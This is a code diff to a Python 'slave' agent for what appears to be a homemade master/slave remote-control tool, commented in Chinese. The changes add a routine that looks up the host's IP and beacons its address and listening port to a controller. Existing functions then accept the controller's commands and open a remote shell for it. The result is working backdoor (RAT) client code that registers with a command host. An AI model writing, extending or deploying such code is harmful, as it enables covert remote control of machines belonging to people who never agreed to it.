@@ -2,10 +2,52 @@
 import json
 import socket
 import subprocess
+import sys
 import threading
-Master_ip = "192.168.1.1"
-Master_port = 9999
+Master_ip = "127.0.0.1"
+Master_port = 9998
 Passport = 1234
+def get_host_ip():
+    """
+    查询本机ip地址
+    :return:
+    """
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8',80))
+        ip=s.getsockname()[0]
+    finally:
+        s.close()
+ 
+    return ip
+
+def tellMasterAddress(master_ip,master_port,myport):
+    """告诉控制端自己的地址和开启的端口
+
+    Args:
+        master_ip (_type_): _description_
+        master_prot (_type_): _description_
+    """
+    slave_code = "1"
+    host_ip = get_host_ip()
+    
+    
+    address_data =[slave_code,host_ip,myport]
+    try:
+        temp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        temp.connect((master_ip,master_port))
+        print("[ ✓ ] Connected")
+        send_data = str(address_data).encode()
+        temp.send(send_data)
+        print("[ ✓ ] Send address success")
+        temp.close()
+        
+    except Exception as e:
+        print ("[ ! ] Connection Errorr")
+        print(e)
+    finally:
+        print("[ * ] Close Connection")
+ 
 
 def connect_master():
     """连接目标机器，且进行初始化操作,获得socket
@@ -18,7 +60,7 @@ def connect_master():
         server.send(Passport)
         
     except Exception as e:
-        print("[*] Exception ! Exiting.")
+        print("[ * ] Exception ! Exiting.")
         print(e)
 
 def listen_master(ip = "0.0.0.0",port = 12345):
@@ -30,8 +72,17 @@ def listen_master(ip = "0.0.0.0",port = 12345):
     """
     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     server.bind((ip,port))
+    
+    try:
+        print("[ * ] Waiting to connect master....")
+        tellMasterAddress(Master_ip,Master_port,port)
+    except Exception as e:
+        #未来写 连不上master机器的情况
+        print(e)
+        sys.exit(0)
+    
     server.listen(5)
-    print(f'[*] Listening on {ip}:{port}')
+    print(f'[ * ] Listening on {ip}:{port}')
     
     while True:
         master_socket,address = server.accept()
@@ -50,6 +101,7 @@ def handler(master_socket):
     # 持续接收数据
     while True:
         msg = master_socket.recv(1024).decode()
+        print(f"msg = {msg}")
         if not msg:
             break
         else:
@@ -126,7 +178,9 @@ def open_shell(master_socket,msg):
     Args:
         msg (str): _description_
     """
-    shell_type = msg.encode()
+    print(f"Shell model : type = {msg[0]}")
+    shell_type = msg[0].encode()
+    
     
     # 给控制端发送 如 xxx# 命令行提示符
     master_socket.send(shell_type)
@@ -145,4 +199,4 @@ Master_choose = {
 }
 
 if __name__ == "__main__":
-    listen_master(port=Master_port)
+    listen_master(port=12345)
